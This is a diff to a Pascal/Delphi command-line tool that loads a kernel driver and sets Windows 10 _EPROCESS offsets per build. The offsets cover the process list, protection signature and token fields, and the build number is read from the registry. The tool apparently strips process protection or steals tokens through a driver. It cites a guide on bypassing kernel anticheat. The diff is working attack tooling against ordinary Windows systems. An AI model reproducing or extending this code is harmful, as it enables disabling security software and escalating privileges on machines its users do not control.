@@ -61,7 +61,7 @@ _PS_PROTECTED_TYPE=
 function EnumDeviceDrivers (lpImageBase: PPointer; cb: DWORD;  var lpcbNeeded: DWORD): BOOL stdcall; external 'psapi.dll';
 
 var
-         dummy:dword;
+         ReleaseID:string;
          targetpid:dword64=0;
          offsets:toffsets;
 
@@ -179,19 +179,49 @@ if device<>thandle(-1) then writeln('closehandle:'+BoolToStr(closehandle(device)
 //writeln(BoolToStr (TerminateProcess (process,0)));
 end;
 
+function ReadRegEntry(strSubKey,strValueName: string): string;
+ var
+  Key: HKey;
+  Buffer: array[0..255] of char;
+  Size: cardinal;
+ begin
+  Result := 'ERROR';
+  Size := SizeOf(Buffer);
+  If RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+   PChar(strSubKey),0,KEY_READ,Key) = ERROR_SUCCESS Then
+    if RegQueryValueEx(Key,PChar(strValueName),nil,nil,
+     @Buffer,@Size) = ERROR_SUCCESS then
+      Result := Buffer;
+  RegCloseKey(Key);
+ end;
+
+function SetOffsets:boolean;
+begin
+ result:=true;
+ with offsets do
+ begin
+ fillchar(offsets,sizeof(offsets),0);
+ case strtoint(releaseid) of
+ 1703:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; end;
+ 1709:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; end;
+ 1803:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; end;
+ 1809:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; end;
+ 1903:begin    EprocessNext :=$02f0;SignatureProtect :=$06f8; Token :=$360; end;
+ 1909:begin    EprocessNext :=$02f0;SignatureProtect :=$06f8; Token :=$360; end;
+ 2004:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; end;
+ //20H2:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; end;
+ //21H1:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; end;
+ else result:=false;
+ end; //case
+ end;//with offsets do
+end;
+
 //https://guidedhacking.com/threads/how-to-bypass-kernel-anticheat-develop-drivers.11325/
 begin
 if paramcount=0 then exit;
-if 1=1 then
-   begin
-   //https://ntdiff.github.io/#versionLeft=Win10_1703_RS2%2Fx64%2FSystem32&filenameLeft=ntoskrnl.exe&typeLeft=Standalone%2F_EPROCESS&versionRight=Win10_1903_19H1%2Fx64%2FSystem32&filenameRight=ntoskrnl.exe&typeRight=Standalone%2F_EPROCESS
-   //1703
-   //2E8 6C8 358
-   //1903
-   offsets.EprocessNext :=$02f0;
-   offsets.SignatureProtect :=$06f8;
-   offsets.Token :=$360;;
-   end;
+ReleaseID:=ReadRegEntry ('SOFTWARE\Microsoft\Windows NT\CurrentVersion','ReleaseID' );
+writeln('ReleaseID:'+releaseid);
+if SetOffsets =false then begin writeln('Offsets unknown') end;
 if (paramcount=2) and (paramstr(1)='load')
    then LoadDriver (ParamStr (2),stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[]));
 if (paramcount=2) and (paramstr(1)='unload')
